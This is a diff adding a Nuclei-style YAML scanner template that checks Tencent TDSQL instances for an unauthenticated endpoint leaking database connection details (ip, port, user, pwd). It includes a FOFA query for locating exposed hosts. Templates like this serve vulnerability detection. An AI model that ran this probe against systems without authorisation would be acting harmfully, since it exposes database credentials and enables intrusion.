@@ -1,0 +1,27 @@
+id: tencent-tdsql-disclosure
+info:
+  name: 腾讯 TDSQL 数据库信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/zan8in/afrog/blob/84a7bbcdc2290c9c04bb72af0512777138b5511c/pocs/afrog-pocs/vulnerability/tencent-tdsql-leak.yaml#L17
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="TDSQL"
+  tags: 2024,tencent,tdsql,disclosure
+
+http:
+  - raw:
+      - |
+        GET /tdsqlpcloud/index.php/api/install/get_db_info HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'ip','port','user','pwd')
+        condition: and
